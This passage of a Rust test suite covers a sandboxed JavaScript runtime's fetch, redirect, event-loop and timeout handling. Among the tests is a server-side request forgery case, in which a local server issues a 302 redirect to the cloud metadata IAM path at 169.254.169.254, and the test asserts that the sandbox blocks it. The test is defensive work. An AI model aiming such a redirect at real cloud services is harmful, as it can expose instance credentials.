    let port_b = origin_b.local_addr().unwrap().port();

    // Origin B accepts 1 cross-origin redirected request and verifies `Authorization` was stripped
    let handle_b = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = origin_b.accept() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req_str = String::from_utf8_lossy(&buf[..n]).to_lowercase();
            let leaked_auth = req_str.contains("authorization:");
            let leaked_cookie = req_str.contains("cookie:");
            let body = format!(
                r#"{{"origin":"B","leakedAuth":{},"leakedCookie":{}}}"#,
                leaked_auth, leaked_cookie
            );
            let resp = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(resp.as_bytes());
        }
    });

    // Origin A serves 5 sequential requests over a SINGLE Keep-Alive TcpStream:
    //   Req 1: GET /chunked -> 200 OK with `Transfer-Encoding: chunked`
    //   Req 2: GET /hop1    -> 302 Found -> `/hop2` (same-origin redirect)
    //   Req 3: GET /hop2    -> 200 OK with `Content-Length` (verifies `Authorization` was preserved same-origin)
    //   Req 4: GET /manual  -> 302 Found -> `/hop2` (client uses `redirect: "manual"`)
    //   Req 5: GET /xorigin -> 302 Found -> `http://127.0.0.1:<port_b>/target` (cross-origin redirect)
    //   Req 6: GET /ssrf-redir -> 302 Found -> `http://169.254.169.254/latest/meta-data/iam`
    let handle_a = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = origin_a.accept() {
            let mut buf = [0u8; 4096];
            for _ in 0..6 {
                let n = match stream.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => n,
                };
                let req_str = String::from_utf8_lossy(&buf[..n]);
                let first_line = req_str.lines().next().unwrap_or("");
                if first_line.contains("/chunked") {
                    let resp = concat!(
                        "HTTP/1.1 200 OK\r\n",
                        "Content-Type: text/plain\r\n",
                        "Transfer-Encoding: chunked\r\n",
                        "Connection: keep-alive\r\n\r\n",
                        "5\r\nhello\r\n",
                        "6\r\n-world\r\n",
                        "0\r\n\r\n"
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/hop1") || first_line.contains("/manual") {
                    let resp = "HTTP/1.1 302 Found\r\nLocation: /hop2\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/hop2") {
                    let has_auth = req_str.to_lowercase().contains("authorization: bearer same-origin-token");
                    let body = format!(r#"{{"hop2":true,"sameOriginAuth":{}}}"#, has_auth);
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: keep-alive\r\nContent-Length: {}\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/xorigin") {
                    let resp = format!(
                        "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{}/target\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
                        port_b
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/ssrf-redir") {
                    let resp = "HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/latest/meta-data/iam\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
                    let _ = stream.write_all(resp.as_bytes());
                }
                let _ = stream.flush();
            }
        }
    });

    let reuse_before_http = crate::outbound_pool_reuse_count();
    let mesh_js = format!(
        r#"
async function runSuite() {{
    const rChunked = await fetch("http://127.0.0.1:{port_a}/chunked");
    const txtChunked = await rChunked.text();

    const rRedir = await fetch("http://127.0.0.1:{port_a}/hop1", {{
        headers: {{ "Authorization": "Bearer same-origin-token" }}
    }});
    const jRedir = await rRedir.json();

    const rManual = await fetch("http://127.0.0.1:{port_a}/manual", {{
        redirect: "manual"
    }});

    const rCross = await fetch("http://127.0.0.1:{port_a}/xorigin", {{
        headers: {{
            "Authorization": "Bearer secret-jwt-token",
            "Cookie": "sid=private-cookie"
        }}
    }});
    const jCross = await rCross.json();

    console.log(JSON.stringify({{
        chunked: txtChunked,
        redirected: rRedir.redirected,
        finalPath: new URL(rRedir.url).pathname,
        sameOriginAuth: jRedir.sameOriginAuth,
        manualStatus: rManual.status,
        manualLocation: rManual.headers.get("location"),
        crossOriginLeakedAuth: jCross.leakedAuth,
        crossOriginLeakedCookie: jCross.leakedCookie
    }}));
}}
runSuite();
"#,
        port_a = port_a
    );
    let mesh_caps = CapabilityToken::pure_compute()
        .with_net_host(format!("127.0.0.1:{}", port_a))
        .with_net_host(format!("127.0.0.1:{}", port_b));
    let mesh_metrics = run_source_isolated(
        "n1-mesh-tenant",
        &mesh_js,
        mesh_caps.clone(),
        4_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    let summary: serde_json::Value = serde_json::from_str(&mesh_metrics.stdout[0]).unwrap();
    assert_eq!(summary["chunked"], "hello-world");
    assert_eq!(summary["redirected"], true);
    assert_eq!(summary["finalPath"], "/hop2");
    assert_eq!(summary["sameOriginAuth"], true);
    assert_eq!(summary["manualStatus"], 302);
    assert_eq!(summary["manualLocation"], "/hop2");
    assert_eq!(summary["crossOriginLeakedAuth"], false);
    assert_eq!(summary["crossOriginLeakedCookie"], false);
    assert!(
        crate::outbound_pool_reuse_count() >= reuse_before_http + 3,
        "Expected Keep-Alive connection reuse across Origin A requests"
    );

    // 3. Verify 302 Redirect to Cloud Metadata IP (`169.254.169.254`) traps immediately!
    let ssrf_redir_js = format!(
        r#"
async function attack() {{
    await fetch("http://127.0.0.1:{}/ssrf-redir");
}}
attack();
"#,
        port_a
    );
    let err_redir = run_source_isolated(
        "n1-ssrf-redir-tenant",
        &ssrf_redir_js,
        mesh_caps,
        1_000_000,
        4 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_redir.to_string().contains("SSRF_METADATA_BLOCKED"),
        "Expected SSRF_METADATA_BLOCKED on 302 redirect to 169.254.169.254, got: {}",
        err_redir
    );

    let _ = handle_a.join();
    let _ = handle_b.join();
}

#[test]
fn test_phase_n2_deterministic_time_travel_event_loop_concurrent_fetch_and_abort_signal() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::time::{Duration, Instant};

    SliceIsolate::prewarm_boa_pool(2);

    // 1. Deterministic Time-Travel Event Loop + Microtask/Macrotask Ordering + Async `slice:test` Rollback:
    //    Schedules 66,000 ms (66 seconds!) of exponential backoff timers + `setInterval` + `queueMicrotask`
    //    and verifies that Virtual Time-Warp completes the entire 66-second schedule in < 50ms of wall time!
    crate::reset_virtual_time_warped_ms();
    let start_wall = Instant::now();
    let det_event_loop_ts = r#"
import { describe, test, expect } from "slice:test";

Slice.resetTests();
Slice.kv.set("workflow:state", "initial", 0);

describe("Phase N-2 Deterministic Time-Travel & Event Loop Suite", () => {
    test("orders queueMicrotask, Promise.then, setTimeout, clearTimeout, and setInterval", async () => {
        const events: string[] = [];
        const t0 = Date.now();

        const cancelledId = setTimeout(() => {
            events.push("cancelled-should-not-run");
        }, 5);
        clearTimeout(cancelledId);

        setTimeout((label: string, code: number) => {
            events.push(`${label}:${code}`);
        }, 20, "timer20", 200);

        setTimeout(() => {
            events.push("timer10");
            queueMicrotask(() => events.push("micro-after-timer10"));
        }, 10);

        let ticks = 0;
        const iv = setInterval(() => {
            ticks += 1;
            events.push(`tick:${ticks}`);
            if (ticks >= 3) {
                clearInterval(iv);
            }
        }, 15);

        Promise.resolve().then(() => events.push("promise-1"));
        queueMicrotask(() => events.push("micro-1"));
        events.push("sync-end");

        // Wait 66,000 ms (66 seconds) via exponential backoff timers (warped in 0ns!)
        await new Promise((r) => setTimeout(r, 1000));
        await new Promise((r) => setTimeout(r, 5000));
        await new Promise((r) => setTimeout(r, 60000));

        const elapsedVirtualMs = Date.now() - t0;
        expect(elapsedVirtualMs).toBeGreaterThanOrEqual(66000);
        expect(events.join(",")).toBe(
            "sync-end,promise-1,micro-1,timer10,micro-after-timer10,tick:1,timer20:200,tick:2,tick:3"
        );

        // Mutate KV after async await to verify `slice:test` waits for async completion before rollback
        Slice.kv.set("workflow:state", "mutated-after-66s-await", 0);
        expect(Slice.kv.get("workflow:state")).toBe("mutated-after-66s-await");
    });

    test("sees clean KV state after async test rollback and tests AbortController", async () => {
        expect(Slice.kv.get("workflow:state")).toBe("initial");

        let ctrl = new AbortController();
        let abortEventFired = false;
        ctrl.signal.addEventListener("abort", () => {
            abortEventFired = true;
        });
        setTimeout(() => ctrl.abort(new Error("CustomCancelReason")), 50);

        let caughtMsg = "";
        try {
            await new Promise((_res, rej) => {
                ctrl.signal.addEventListener("abort", () => rej(ctrl.signal.reason));
            });
        } catch (err: any) {
            caughtMsg = String(err.message || err);
        }
        expect(abortEventFired).toBe(true);
        expect(ctrl.signal.aborted).toBe(true);
        expect(caughtMsg).toContain("CustomCancelReason");

        // Also verify pre-aborted AbortSignal.abort() rejects fetch immediately without network I/O
        let preAbortedMsg = "";
        try {
            await fetch("https://example.com/never-dialed", {
                signal: AbortSignal.abort(new Error("PreAbortedSignal"))
            });
        } catch (err2: any) {
            preAbortedMsg = String(err2.message || err2);
        }
        expect(preAbortedMsg).toContain("PreAbortedSignal");
    });
});

console.log(JSON.stringify(Slice.testSummary()));
"#;
    let bundled_det = slice_cas::strip_typescript_and_normalize(det_event_loop_ts, true);
    let bc_det = compile_source_to_bytecode(&bundled_det);
    let mut iso_det = SliceIsolate::spawn(
        "n2-det-event-loop",
        1,
        CapabilityToken::pure_compute().with_net_host("example.com"),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_det.set_deterministic_seed(Some(20261102));
    let det_metrics = iso_det.execute_bytecode(&bc_det, None).unwrap();
    let wall_elapsed = start_wall.elapsed();
    let warped_ms = crate::virtual_time_warped_ms();

    let summary: serde_json::Value = serde_json::from_str(&det_metrics.stdout[0]).unwrap();
    assert_eq!(summary["total"], 2);
    assert_eq!(summary["passed"], 2);
    assert_eq!(summary["failed"], 0, "Test summary: {}", summary);
    assert_eq!(summary["checkpointsRestored"], 2);
    assert!(
        warped_ms >= 66_000,
        "Expected >= 66,000ms of virtual time warp, got {}ms",
        warped_ms
    );
    assert!(
        wall_elapsed < Duration::from_millis(100),
        "66-second deterministic timer suite should finish in < 100ms, took {:?}",
        wall_elapsed
    );

    // 2. True Concurrent `Promise.all([fetch(u1), fetch(u2), fetch(u3), fetch(u4)])` + `AbortSignal.timeout(ms)`:
    //    4 upstream servers each sleep 60ms before responding; sequential execution would take >= 240ms.
    //    A 5th upstream sleeps 350ms and is raced against `AbortSignal.timeout(40)`.
    let mut ports = Vec::new();
    let mut handles = Vec::new();
    for idx in 0..4 {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        ports.push(port);
        handles.push(std::thread::spawn(move || {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let _ = stream.read(&mut buf);
                std::thread::sleep(Duration::from_millis(60));
                let body = format!(r#"{{"shard":{},"ok":true}}"#, idx);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.flush();
            }
        }));
    }

    let slow_listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let slow_port = slow_listener.local_addr().unwrap().port();
    handles.push(std::thread::spawn(move || {
        if let Ok((mut stream, _)) = slow_listener.accept() {
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            std::thread::sleep(Duration::from_millis(350));
            let _ = stream.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Length: 11\r\nConnection: close\r\n\r\n{\"slow\":true}",
            );
        }
    }));

    let mut caps = CapabilityToken::pure_compute();
    for &p in &ports {
        caps = caps.with_net_host(format!("127.0.0.1:{}", p));
    }
    caps = caps.with_net_host(format!("127.0.0.1:{}", slow_port));

    let fanout_js = format!(
        r#"
async function runFanout() {{
    const responses = await Promise.all([
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
    ]);
    const payloads = await Promise.all(responses.map((r) => r.json()));
    const shards = payloads.map((p) => p.shard);

    let timeoutAborted = false;
    let timeoutError = "";
    try {{
        await fetch("http://127.0.0.1:{}/slow", {{
            signal: AbortSignal.timeout(35)
        }});
    }} catch (err) {{
        timeoutAborted = true;
        timeoutError = String(err && err.message || err);
    }}

    console.log(JSON.stringify({{
        shards,
        timeoutAborted,
        isTimeoutErr: timeoutError.indexOf("TimeoutError") !== -1
    }}));
}}
runFanout();
"#,
        ports[0], ports[1], ports[2], ports[3], slow_port
    );

    let fanout_start = Instant::now();
    let fanout_metrics = run_source_isolated(
        "n2-fanout-tenant",
        &fanout_js,
        caps,
        5_000_000,
        8 * 1024 * 1024,
    )
    .unwrap();
    let fanout_elapsed = fanout_start.elapsed();
    let fanout_out: serde_json::Value = serde_json::from_str(&fanout_metrics.stdout[0]).unwrap();
    assert_eq!(fanout_out["shards"], serde_json::json!([0, 1, 2, 3]));
    assert_eq!(fanout_out["timeoutAborted"], true);
    assert_eq!(fanout_out["isTimeoutErr"], true);
    assert!(
        fanout_elapsed < Duration::from_millis(220),
        "Expected 4x60ms parallel fan-out + 35ms timeout to complete in < 220ms, took {:?}",
        fanout_elapsed
    );

    // 3. Verify un-cleared infinite `setInterval` is bounded and trapped by `MAX_EVENT_LOOP_TICKS`
    let runaway_interval_js = r#"
setInterval(() => {
    // Runaway interval that never calls clearInterval
}, 1);
"#;
    let mut iso_runaway = SliceIsolate::spawn(
        "n2-runaway-interval",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    iso_runaway.set_deterministic_seed(Some(99));
    let runaway_bc = compile_source_to_bytecode(runaway_interval_js);
    let runaway_res = iso_runaway.execute_bytecode(&runaway_bc, None);
    assert!(matches!(
        runaway_res,
        Err(SandboxViolation::CpuFuelExhausted { .. })
    ));

    for h in handles {
        let _ = h.join();
    }
}


